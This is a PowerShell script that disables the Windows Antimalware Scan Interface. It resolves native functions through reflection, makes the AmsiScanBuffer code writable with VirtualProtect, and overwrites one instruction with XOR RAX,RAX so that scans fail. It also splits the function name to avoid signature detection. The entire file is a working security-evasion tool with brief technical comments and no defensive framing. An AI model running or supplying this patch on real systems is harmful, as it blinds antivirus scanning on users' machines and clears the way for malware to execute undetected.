﻿function LookupFunc {

    Param ($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

# Get start address
[IntPtr]$funcAddr = LookupFunc amsi.dll ('Ams'+'iScan'+'Buffer')
# Set target address to first TEST RSI,RSI
[IntPtr]$targetAddr = [long]$funcAddr + 106
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect),(getDelegateType @([IntPtr],[UInt32],[UInt32],[UInt32].MakeByRefType())([Bool])))
# Set memory protection to PAGE_EXECUTE_READWRITE/WRITECOPY
$vp.Invoke($targetAddr,3,0x40,[ref]$oldProtectionBuffer)
# Overwrite TEST RSI,RSI with XOR RAX,RAX to zero out Zero flag and execute error branch of code
$buf=[Byte[]](0x48,0x31,0xC0)
[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$targetAddr,3)
# Reset memory protection to PAGE_EXECUTE_READ
$vp.Invoke($targetAddr,3,0x20,[ref]$oldProtectionBuffer)
